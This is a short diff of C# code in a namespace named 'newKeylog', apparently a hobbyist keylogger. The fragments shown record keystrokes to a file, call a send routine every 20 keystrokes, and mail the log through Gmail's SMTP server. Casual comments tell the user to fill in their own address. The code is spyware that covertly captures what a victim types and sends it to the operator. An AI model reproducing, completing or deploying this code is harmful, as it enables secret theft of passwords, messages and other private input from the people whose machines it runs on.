@@ -46,7 +46,7 @@ namespace newKeylog
                             sw.Write((char) i);
                         }
                         numberOfKeystrokes++;
-                        if (numberOfKeystrokes % 20 == 0)
+                        if (numberOfKeystrokes % 20 == 0)//its depend how many letter u want
                         {
                             SendMessage();
                         }
@@ -76,7 +76,7 @@ namespace newKeylog
             SmtpClient client = new SmtpClient("smtp.gmail.com" , 587);
             MailMessage mailMessage = new MailMessage();
             mailMessage.From = new MailAddress("");//put ur gmail here
-            mailMessage.To.Add("m");//same again cuz u just send it to ur selves
+            mailMessage.To.Add("");//same again cuz u just send it to ur selves
             mailMessage.Subject = subject;
             client.UseDefaultCredentials = false;
             client.EnableSsl = true;
